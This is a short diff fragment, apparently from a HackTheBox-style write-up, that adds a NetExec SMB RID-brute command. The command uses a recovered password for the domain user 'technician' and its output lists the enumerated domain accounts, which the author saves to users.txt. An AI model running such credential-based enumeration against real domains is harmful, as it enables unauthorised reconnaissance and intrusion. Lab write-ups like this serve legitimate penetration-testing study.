@@ -351,6 +351,27 @@ SMB         10.129.230.179  445    DC-ANALYSIS      [+] analysis.htb\technician:
 
 This password also works on the domain
 
+```python
+❯❯❯ nxc smb dc-analysis.analysis.htb -u 'technician' -p '97NTtl*4QP96Bv' --rid-brute 20000 | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
+Administrateur
+Invité
+krbtgt
+DC-ANALYSIS$
+jdoe
+soc_analyst
+cwilliams
+technician
+webservice
+wsmith
+jangel
+lzen
+svc_web
+amanson
+badam
+```
+
+Ill grab all the users to make sure i didnt miss any
+
 
 
 
